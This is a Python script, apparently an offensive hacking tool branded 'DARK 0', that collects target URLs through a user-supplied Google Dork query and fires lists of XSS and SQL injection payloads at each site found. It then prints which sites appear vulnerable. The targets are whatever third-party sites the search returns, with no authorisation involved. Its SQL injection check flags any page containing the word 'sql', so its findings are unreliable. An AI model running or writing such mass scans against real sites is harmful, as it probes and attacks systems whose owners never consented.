import requests
from googlesearch import search
from colorama import Fore, Style
import pyfiglet

# إعداد اسم البرنامج مع اللون الأزرق الفاتح
ascii_banner = pyfiglet.figlet_format("DARK 0")
print(Fore.CYAN + ascii_banner + Style.RESET_ALL)

# اختبار ثغرات XSS مع بايلودات متعددة وتصنيفها
def test_xss(url):
    xss_payloads = {
        "Reflected XSS": "<script>alert('XSS')</script>",
        "Stored XSS": "<img src=x onerror=alert('Stored XSS')>",
        "DOM-Based XSS": "#<script>alert('DOM-Based XSS')</script>",
        "Basic XSS": "<svg/onload=alert('XSS')>",
        "Href XSS": "<a href='javascript:alert(1)'>Click me</a>",
        "Iframe XSS": "<iframe src='javascript:alert(1)'></iframe>"
    }
    headers = {"User-Agent": "Mozilla/5.0"}

    for xss_type, payload in xss_payloads.items():
        try:
            response = requests.get(url, params={"search": payload}, headers=headers, timeout=10)
            if payload in response.text:
                # تأكيد أن الثغرة موجودة من خلال طلب ثاني
                confirm_response = requests.get(url, params={"search": payload}, headers=headers, timeout=10)
                if payload in confirm_response.text:
                    return xss_type
        except requests.RequestException:
            return False
    return False

# اختبار ثغرات SQL Injection مع بايلودات متعددة وتأكيد وجودها
def test_sql_injection(url):
    sql_payloads = [
        "' OR '1'='1",
        "' UNION SELECT NULL, NULL--",
        "' OR 'a'='a",
        "\" OR \"\"=\"",
        "OR 1=1--",
        "' AND 1=2 UNION SELECT 1, 'anotherstring'"
    ]
    headers = {"User-Agent": "Mozilla/5.0"}

    for payload in sql_payloads:
        try:
            response = requests.get(url, params={"search": payload}, headers=headers, timeout=10)
            if "syntax error" in response.text.lower() or "sql" in response.text.lower():
                # تأكيد أن الثغرة موجودة من خلال طلب ثاني
                confirm_response = requests.get(url, params={"search": payload}, headers=headers, timeout=10)
                if "syntax error" in confirm_response.text.lower() or "sql" in confirm_response.text.lower():
                    return True
        except requests.RequestException:
            return False
    return False

# الحصول على نتائج بحث Google باستخدام Google Dork
def get_google_search_results(query, num_results=10):
    links = []
    try:
        for result in search(query, num=num_results, stop=num_results, pause=2):
            links.append(result)
    except Exception as e:
        print(Fore.RED + f"Error fetching search results: {e}" + Style.RESET_ALL)
    return links

def main():
    query = input("Enter the Google Dork query: ")
    num_results = 50  # عدد النتائج المراد جلبها

    links = get_google_search_results(query, num_results)

    print(Fore.GREEN + "Checking for vulnerabilities..." + Style.RESET_ALL)
    
    for link in links:
        vulnerabilities = []

        xss_type = test_xss(link)
        if xss_type:
            vulnerabilities.append(f"XSS ({xss_type})")

        if test_sql_injection(link):
            vulnerabilities.append("SQL Injection")
        
        if vulnerabilities:
            print(Fore.GREEN + f"{link} - Vulnerabilities: {', '.join(vulnerabilities)}" + Style.RESET_ALL)
        else:
            print(Fore.RED + f"{link} - No vulnerability detected" + Style.RESET_ALL)

if __name__ == "__main__":
    main()
